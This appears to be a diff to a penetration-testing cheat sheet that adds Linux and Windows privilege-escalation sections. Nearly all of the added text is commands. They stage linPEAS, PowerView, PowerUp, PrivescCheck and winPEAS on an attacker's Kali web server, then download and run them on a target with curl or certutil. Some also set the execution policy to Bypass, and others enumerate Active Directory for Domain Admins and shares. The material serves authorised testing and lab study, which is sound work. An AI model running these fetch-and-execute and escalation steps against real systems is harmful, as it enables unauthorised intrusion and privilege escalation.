@@ -407,13 +407,111 @@ proxychains nmap -p- -A $TARGET_INTERNAL_NETWORK
 
 ## 6. Linux privilege escalation
 
-https://github.com/carlospolop/PEASS-ng/releases
+#### [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+
+[Releases](https://github.com/carlospolop/PEASS-ng/releases)
+
+|   |   |
+|---|---|
+|Prepare Kali|`curl -L -o /var/www/html/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/download/20221211/linpeas.sh`|
+|Download and run on target|`curl -O http://$KALI/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`|
 
 ## 7. Windows privilege escalation
 
-https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
+### [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
-https://github.com/carlospolop/PEASS-ng/releases
+Prepare Kali:
+
+```console
+curl -o /var/www/html/PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+```
+
+Import on target:
+
+```console
+certutil.exe -urlcache -f -split http://$KALI/PowerView.ps1
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+Import-Module .\PowerView.ps1
+Get-Module
+```
+
+Interesting commands:
+
+```console
+Get-Domain
+Get-DomainController
+(Get-DomainPolicy).SystemAccess
+Get-DomainUser | Where-Object {$_.memberof -like '*Domain Admins*'} | Format-Table -AutoSize samaccountname,memberof
+Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Format-Table -AutoSize MemberName
+Get-DomainGroup -MemberIdentity <username> | Format-Table -AutoSize samaccountname
+Invoke-ShareFinder
+Get-NetGPO | Format-Table -AutoSize displayname,whenchanged,whencreated
+```
+
+<details>
+  <summary><h3><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></h3></summary>
+
+Prepare Kali:
+
+```console
+curl -o /var/www/html/Get-System.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1
+curl -o /var/www/html/PowerUp.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+curl -o /var/www/html/Privesc.psd1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Privesc.psd1
+curl -o /var/www/html/Privesc.psm1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Privesc.psm1
+```
+
+Import on target:
+
+```console
+certutil.exe -urlcache -f -split http://$KALI/Get-System.ps1
+certutil.exe -urlcache -f -split http://$KALI/PowerUp.ps1
+certutil.exe -urlcache -f -split http://$KALI/Privesc.psd1
+certutil.exe -urlcache -f -split http://$KALI/Privesc.psm1
+Set-ExecutionPolicy Bypass -Scope CurrentUser
+Import-Module .\Privesc.psm1
+Get-Module
+Get-Command -Module Privesc
+```
+
+Run check:
+
+```console
+Invoke-AllChecks
+```
+
+</details>
+
+### [PrivescCheck](https://github.com/itm4n/PrivescCheck)
+
+Prepare Kali:
+
+```console
+curl -o /var/www/html/PrivescCheck https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
+```
+
+Import on target:
+
+```console
+certutil.exe -urlcache -f -split http://$KALI/PrivescCheck.ps1
+Set-ExecutionPolicy Bypass -Scope CurrentUser
+Import-Module .\PrivescCheck.ps1
+Get-Module
+```
+
+Run check:
+
+```console
+Invoke-PrivescCheck
+```
+
+#### [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+[Releases](https://github.com/carlospolop/PEASS-ng/releases)
+
+|   |   |
+|---|---|
+|Prepare Kali|`curl -L -o /var/www/html/winPEAS.bat https://github.com/carlospolop/PEASS-ng/releases/download/20221211/winPEAS.bat`|
+|Download and run on target|`certutil.exe /urlcache /f /split http://$KALI/winPEAS.bat %TEMP%\winPEAS.bat && %TEMP%\winPEAS.bat`|
 
 ## 8. Active Directory
 
